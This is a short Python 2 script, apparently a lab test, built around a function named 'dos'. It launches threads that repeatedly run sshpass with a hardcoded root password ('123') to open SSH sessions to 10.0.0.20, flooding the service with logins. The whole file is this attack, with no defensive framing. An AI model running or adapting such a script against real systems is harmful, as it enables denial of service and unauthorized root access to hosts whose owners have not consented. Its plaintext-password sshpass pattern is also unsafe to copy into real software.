import itertools
import random
from threading import Thread
import string
import time
import os

delays = [0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.8, 0.9]
url = "10.0.0.20"
#comando = "sshpass -p 123 ssh -p 2222 root@" + url
comando = "sshpass -p 123 ssh root@" + url

def dos(delay, comando):
    cont = 0
    while cont < 10:
        time.sleep(delay)
        os.system(comando)
        print comando
        cont+=1

contador = 0
try:
    while contador < 10:
        th=Thread(target=dos, args=(delays[random.randint(0, 8)],comando))
        th.start()
        os.system(comando)
        contador+=1
except:
   print  'ERRORROROR', contador

#while 1:
 #  pass
